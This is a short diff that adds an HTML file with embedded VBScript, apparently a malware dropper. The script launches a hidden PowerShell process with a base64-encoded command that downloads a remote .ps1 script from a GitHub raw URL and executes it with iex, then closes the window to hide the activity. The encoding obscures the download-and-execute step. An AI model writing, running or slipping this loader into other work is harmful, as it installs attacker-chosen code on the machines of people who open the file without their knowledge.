@@ -1,0 +1,8 @@
+<html>
+<script language="VBScript">
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+shell.Run "powershell -encodedCommand aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ANAAzAGEAMQA3ADIAMwAvAHQAZQBzAHQALwBtAGEAaQBuAC8AZABvAHcAbgBsAG8AYQBkAC4AcABzADEAJwApACAAfAAgAGkAZQB4AA==", 0
+window.close
+</script>
+</html>
